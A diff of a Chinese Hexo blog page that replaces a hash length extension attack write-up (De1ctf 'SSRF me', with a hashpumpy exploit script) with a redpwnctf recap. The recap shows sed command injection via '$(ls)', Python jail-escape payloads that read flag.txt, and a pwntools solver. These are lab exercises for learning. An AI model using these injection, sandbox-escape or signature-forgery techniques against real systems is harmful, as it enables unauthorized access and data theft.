@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="hash,De1ctf,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -81,25 +81,28 @@
 
 
 
-<meta name="description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
-<meta name="keywords" content="hash,De1ctf">
+<meta name="description" content="MISC he sed shi sed 一道很有意思的题目，看了一下源码如下： 12345678910from os import systeminp = input(&quot;What you thought you sed\n&quot;)rep = &apos;/&apos; + input(&quot;What you aren&apos;t sure you sed\n&quot;) +  &apos;/&apos; new = input(&quot;What you actual">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初见哈希扩展攻击">
-<meta property="og:url" content="https://prontosil.club/2019/08/05/初见哈希扩展攻击/index.html">
+<meta property="og:title" content="redpwnctf复盘">
+<meta property="og:url" content="https://prontosil.club/2019/08/19/redpwnctf复盘/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
+<meta property="og:description" content="MISC he sed shi sed 一道很有意思的题目，看了一下源码如下： 12345678910from os import systeminp = input(&quot;What you thought you sed\n&quot;)rep = &apos;/&apos; + input(&quot;What you aren&apos;t sure you sed\n&quot;) +  &apos;/&apos; new = input(&quot;What you actual">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png">
-<meta property="og:updated_time" content="2019-08-05T12:33:57.202Z">
+<meta property="og:image" content="https://i.loli.net/2019/08/19/cdaOznu5NMPTD4p.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed1.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/19/iw71jLN54Fvr6KY.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/19/SEOXJqPplGFi4U5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail1.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/19/ObmNvATC9y2qPtD.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue0.png">
+<meta property="og:updated_time" content="2019-08-19T08:11:00.962Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="初见哈希扩展攻击">
-<meta name="twitter:description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png">
+<meta name="twitter:title" content="redpwnctf复盘">
+<meta name="twitter:description" content="MISC he sed shi sed 一道很有意思的题目，看了一下源码如下： 12345678910from os import systeminp = input(&quot;What you thought you sed\n&quot;)rep = &apos;/&apos; + input(&quot;What you aren&apos;t sure you sed\n&quot;) +  &apos;/&apos; new = input(&quot;What you actual">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/19/cdaOznu5NMPTD4p.png">
 
 
 
@@ -129,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="https://prontosil.club/2019/08/05/初见哈希扩展攻击/">
+  <link rel="canonical" href="https://prontosil.club/2019/08/19/redpwnctf复盘/">
 
 
 
 
 
-  <title>初见哈希扩展攻击 | prontosil</title>
+  <title>redpwnctf复盘 | prontosil</title>
   
 
 
@@ -308,7 +311,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/05/初见哈希扩展攻击/">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/19/redpwnctf复盘/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="百浪多息">
@@ -325,7 +328,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">初见哈希扩展攻击</h1>
+          <h1 class="post-title" itemprop="name headline">redpwnctf复盘</h1>
         
 
 		
@@ -340,8 +343,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T20:05:49+08:00">
-                2019-08-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-19T14:20:38+08:00">
+                2019-08-19
               </time>
             
 
@@ -356,8 +359,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-05T20:33:57+08:00">
-                2019-08-05
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-19T16:11:00+08:00">
+                2019-08-19
               </time>
             
           </span>
@@ -406,7 +409,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  866
+                  956
                 </span>
               
 
@@ -422,7 +425,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  3
+                  4
                 </span>
               
             </div>
@@ -443,47 +446,66 @@
       
 
       
-        <p>目前还是太菜了，向师傅们好好学习</p>
-<h2>SSRF me</h2>
-<p>点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/index.py" target="_blank" rel="noopener">代码</a></p>
-<p>程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的
-访问<code>/geneSign</code>可以得到sign的值, action可以是<code>scan</code>或<code>read</code>,但是在访问<code>/De1ctf</code>时,会检验sign是否正确,sign的生成算法：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
-<p>这其中<code>secret_key</code>是不知道的,并且<code>gengeSign</code>限制了action只能是<code>scan</code>,结合后来题目的提示是访问<code>flag.txt</code>,但是最多将这个文件读入<code>result.txt</code>,却不能读取出来。</p>
-<p>这样想来是不是只能爆破<code>secret_key</code>了？但是<code>secret_key</code>又怎么会那么容易给你呢。。</p>
-<p>这就涉及到我的知识盲区了,叫做哈希扩展攻击。。</p>
-<p>先看实验吧一道例题</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png" alt=""></p>
-<p>这题，注入不想注入，源码没扫出来，啥信息都没有？</p>
-<p>还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png" alt=""></p>
-<p>hhh没想到吧</p>
-<p>原来可以通过这种方式获取到源代码。。</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>empty函数 非空返回false，别想多了</p>
-</blockquote>
-<p>关键在这里：
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>其中<code>$secret</code>是不知道的，<code>$username</code>和<code>password</code>是可以控制的，并且<code>$secret</code>的长度是15</p>
-<p>哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞</p>
-<p>首先username必须是admin,password不能是admin那就随便输一个值比如cck</p>
-<p>我们的目标很简单，就是绕过它
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>所以目标就是让<code>$COOKIE[&quot;getmein&quot;]</code>和md5后的值相等，所以需要同时伪造两边的值天平才能平衡</p>
-<p>而hashpump工具就是来干这个的：
-<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png" alt=""></p>
-<p>第一个参数是<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。
-这样就能同时生成天平左边和右边的值了</p>
-<p>当然还需要URL编码一下</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png" alt=""></p>
-<p>理解了这题那么这道De1ctf的题目也就好说了</p>
-<p>参考ctftime上的exp代码如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">    hexdigest(str):      Hex-encoded result of hashing key + original_data.</span></span><br><span class="line"><span class="string">    original_data(str):  Known data used to get the hash result hexdigest.</span></span><br><span class="line"><span class="string">    data_to_add(str):    Data to append</span></span><br><span class="line"><span class="string">    key_length(int):     Length of unknown data prepended to the hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    A tuple containing the new hex digest and the new message.</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = <span class="string">'flag.txt'</span></span><br><span class="line">param = <span class="string">'param='</span> + payload</span><br><span class="line">base_url = <span class="string">'http://139.180.128.86/'</span></span><br><span class="line">signurl = base_url + <span class="string">'geneSign?'</span> + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;<span class="string">'action'</span>:<span class="string">'scan'</span>&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print(sign)</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line">print(readsign)</span><br><span class="line"><span class="comment"># print add_data</span></span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print(add_data)</span><br><span class="line">expurl = base_url + <span class="string">'De1ta?'</span> + param</span><br><span class="line">print(urllib.parse.quote(add_data))</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;<span class="string">'action'</span>:urllib.parse.quote(add_data),<span class="string">'sign'</span>:readsign&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure></p>
-<p>当然我用的是python3，并且注意<code>urllib.parse.quote(add_data)</code>方法</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png" alt=""></p>
-<p>就成功了</p>
+        <h2>MISC</h2>
+<h3>he sed shi sed</h3>
+<p>一道很有意思的题目，看了一下源码如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line">inp = input(<span class="string">"What you thought you sed\n"</span>)</span><br><span class="line">rep = <span class="string">'/'</span> + input(<span class="string">"What you aren't sure you sed\n"</span>) +  <span class="string">'/'</span> </span><br><span class="line">new = input(<span class="string">"What you actually sed\n"</span>)</span><br><span class="line">cmd = <span class="string">'s'</span> + rep + new + <span class="string">"/g"</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"'"</span> <span class="keyword">not</span> <span class="keyword">in</span> new:</span><br><span class="line">	cmd += <span class="string">"'"</span></span><br><span class="line">print(<span class="string">"You actually said"</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">"echo '"</span> + inp + <span class="string">"' | sed '"</span> +  cmd)</span><br></pre></td></tr></table></figure></p>
+<p>sed命令是一种文本处理的命令， <code>sed s/a/b/g</code> 就是替换</p>
+<p>如果我们输入：
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">What you thought you sed</span><br><span class="line">abcdef</span><br><span class="line">What you aren&apos;t sure you sed</span><br><span class="line">b</span><br><span class="line">What you actually sed</span><br><span class="line">c</span><br><span class="line">You actually said</span><br><span class="line">accdef</span><br></pre></td></tr></table></figure></p>
+<p>可以据此猜测出就是将b替换成了c</p>
+<p>于是猜测命令如下： <code>echo $1 | sed 's/$2/$3/g'</code></p>
+<p>注意到这两种命令的区别
+<img src="https://i.loli.net/2019/08/19/cdaOznu5NMPTD4p.png" alt="quicker_dac8f1e9-20ce-4746-bbbb-27e0bc137879.png"></p>
+<p>于是输入<code>$(ls)</code></p>
+<p>得到的结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed0.png" alt=""></p>
+<p>然后尝试输入<code>'$(ls)'</code></p>
+<p>这个时候就得到结果了，实现了命令注入</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed1.png" alt=""></p>
+<h2>genericpyjail</h2>
+<p><img src="https://i.loli.net/2019/08/19/iw71jLN54Fvr6KY.png" alt="quicker_4e9a7047-e4a7-477b-86b3-adfc70059d14.png"></p>
+<p>题目给了一个黑名单，并且提示你黑名单是不安全的，也就是要绕过了。</p>
+<p><img src="https://i.loli.net/2019/08/19/SEOXJqPplGFi4U5.png" alt="quicker_f9f6685e-69df-4cfd-b0f7-9a472f9c8395.png"></p>
+<p>很多都被禁止了，那么如何才能够绕过这些限制来达到任意命令执行呢</p>
+<p>这里可以使用unicode编码来绕过限制hhh（没想到吧</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail0.png" alt=""></p>
+<p>或者这样也行：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail1.png" alt=""></p>
+<p>payload:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;\u0066\u003d\u006f\u0070\u0065\u006e\u0028\u0022\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074\u0022\u002c\u0020\u0022\u0072\u0022\u0029&apos;.decode(&apos;unicode-escape&apos;)</span><br><span class="line">&apos;\u0070\u0072\u0069\u006e\u0074\u0028\u0066\u002e\u0072\u0065\u0061\u0064\u0028\u0029\u0029&apos;.decode(&apos;unicode-escape&apos;)</span><br><span class="line"></span><br><span class="line">or--</span><br><span class="line"></span><br><span class="line">exit(getattr(locals().get(chr(95)*2+&apos;built&apos;+&apos;ins&apos;+chr(95)*2), &apos;op&apos;+&apos;en&apos;)(&apos;fl&apos;+&apos;ag.txt&apos;).read())</span><br></pre></td></tr></table></figure></p>
+<p>留下一个问题，怎么将字符转为Unicode编码。。</p>
+<h3>Tux Trivia Show</h3>
+<p>一个师傅的exp</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.2019.redpwn.net"</span>, <span class="number">6001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"!!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(p.recv())</span><br><span class="line">        s = p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        s = p.recv()</span><br><span class="line">        print(s)</span><br><span class="line">    print(s)</span><br><span class="line">    s = s[:<span class="number">-1</span>]</span><br><span class="line">    s = s.split(<span class="string">'capital of '</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    ans = check_output([<span class="string">'python3'</span>, <span class="string">'get_capital.py'</span>, s])</span><br><span class="line">    print(ans) </span><br><span class="line">    p.sendline(ans)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><code>get_capital.py</code>如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> countryinfo <span class="keyword">import</span> CountryInfo</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">country = sys.argv[<span class="number">1</span>]</span><br><span class="line">country_obj = CountryInfo(country)</span><br><span class="line"></span><br><span class="line">caps = &#123;<span class="string">'New Mexico'</span>: <span class="string">'Santa Fe'</span>, <span class="string">'Colorado'</span>: <span class="string">'Denver'</span>, <span class="string">'Vermont'</span>: <span class="string">'Montpelier'</span>, <span class="string">'Arizona'</span>: <span class="string">'Phoenix'</span>, <span class="string">'Iowa'</span>: <span class="string">'Des Moines'</span>, <span class="string">'Florida'</span>: <span class="string">'Tallahassee'</span>, <span class="string">'West Virginia'</span>: <span class="string">'Charleston'</span>, <span class="string">'Illinois'</span>: <span class="string">'Springfield'</span>, <span class="string">'Oregon'</span>: <span class="string">'Salem'</span>, <span class="string">'Kansas'</span>: <span class="string">'Topeka'</span>, <span class="string">'Arkansas'</span>: <span class="string">'Little Rock'</span>, <span class="string">'Kentucky'</span>: <span class="string">'Frankfort'</span>, <span class="string">'Massachusetts'</span>: <span class="string">'Boston'</span>, <span class="string">'Texas'</span>: <span class="string">'Austin'</span>, <span class="string">'Wyoming'</span>: <span class="string">'Cheyenne'</span>, <span class="string">'Maryland'</span>: <span class="string">'Annapolis'</span>, <span class="string">'New York'</span>: <span class="string">'Albany'</span>, <span class="string">'New Jersey'</span>: <span class="string">'Trenton'</span>, <span class="string">'Louisiana'</span>: <span class="string">'Baton Rouge'</span>, <span class="string">'South Carolina'</span>: <span class="string">'Columbia'</span>, <span class="string">'Georgia'</span>: <span class="string">'Atlanta'</span>, <span class="string">'Idaho'</span>: <span class="string">'Boise'</span>, <span class="string">'Alaska'</span>: <span class="string">'Juneau'</span>, <span class="string">'Oklahoma'</span>: <span class="string">'Oklahoma City'</span>, <span class="string">'Connecticut'</span>: <span class="string">'Hartford'</span>, <span class="string">'Nebraska'</span>: <span class="string">'Lincoln'</span>, <span class="string">'Tennessee'</span>: <span class="string">'Nashville'</span>, <span class="string">'Pennsylvania'</span>: <span class="string">'Harrisburg'</span>, <span class="string">'Michigan'</span>: <span class="string">'Lansing'</span>, <span class="string">'Maine'</span>: <span class="string">'Augusta'</span>, <span class="string">'Wisconsin'</span>: <span class="string">'Madison'</span>, <span class="string">'South Dakota'</span>: <span class="string">'Pierre'</span>, <span class="string">'California'</span>: <span class="string">'Sacramento'</span>, <span class="string">'New Hampshire'</span>: <span class="string">'Concord'</span>, <span class="string">'Indiana'</span>: <span class="string">'Indianapolis'</span>, <span class="string">'Washington'</span>: <span class="string">'Olympia'</span>, <span class="string">'Utah'</span>: <span class="string">'Salt Lake City'</span>, <span class="string">'Alabama'</span>: <span class="string">'Montgomery'</span>, <span class="string">'Minnesota'</span>: <span class="string">'St. Paul'</span>, <span class="string">'Hawaii'</span>: <span class="string">'Honolulu'</span>, <span class="string">'Ohio'</span>: <span class="string">'Columbus'</span>, <span class="string">'Missouri'</span>: <span class="string">'Jefferson City'</span>, <span class="string">'Delaware'</span>: <span class="string">'Dover'</span>, <span class="string">'Virginia'</span>: <span class="string">'Richmond'</span>, <span class="string">'Nevada'</span>: <span class="string">'Carson City'</span>, <span class="string">'Montana'</span>: <span class="string">'Helena'</span>, <span class="string">'North Dakota'</span>: <span class="string">'Bismarck'</span>, <span class="string">'Mississippi'</span>: <span class="string">'Jackson'</span>, <span class="string">'North Carolina'</span>: <span class="string">'Raleigh'</span>, <span class="string">'Rhode Island'</span>: <span class="string">'Providence'</span>, <span class="string">'Bahamas'</span>: <span class="string">'Nassau'</span>, <span class="string">'Andorra'</span>: <span class="string">'Andorra la Vella'</span>, <span class="string">'East Timor (Timor-Leste)'</span>: <span class="string">'Dili'</span>, <span class="string">'Serbia'</span>: <span class="string">'Belgrade'</span>, <span class="string">'Macedonia'</span>: <span class="string">'Skopje'</span>, <span class="string">'Gambia'</span>: <span class="string">'Banjul'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open('usstates.csv', 'r') as f:</span></span><br><span class="line"><span class="comment">#     for l in f:</span></span><br><span class="line"><span class="comment">#         l = l.strip()</span></span><br><span class="line"><span class="comment">#         state, cap = l.split(',')</span></span><br><span class="line"><span class="comment">#         caps[state] = cap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">'Georgia'</span>:</span><br><span class="line">        print(caps[<span class="string">'Georgia'</span>])</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'San Marino'</span>:</span><br><span class="line">        print(<span class="string">'San Marino'</span>)</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'Kiribati'</span>:</span><br><span class="line">        print(<span class="string">'Tarawa'</span>)</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'Moldova'</span>:</span><br><span class="line">        print(<span class="string">'Chisinau'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(country_obj.capital())</span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    print(caps[country])</span><br></pre></td></tr></table></figure></p>
+<h3>genericpyjail2</h3>
+<p>还是一道python沙盒逃逸的题目</p>
+<p>源码
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gone = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> gone:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'wow! again, there\'s a file called flag.txt! insane!'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      x = raw_input()      </span><br><span class="line">      <span class="keyword">if</span> <span class="string">" "</span> <span class="keyword">in</span> x:</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"no spaces!"</span></span><br><span class="line">       exit()    </span><br><span class="line">      <span class="keyword">print</span> <span class="string">"now it's "</span>, x, <span class="string">"!"</span></span><br><span class="line">      <span class="keyword">exec</span> <span class="string">'x='</span> + x</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'Exception: '</span>, e</span><br></pre></td></tr></table></figure></p>
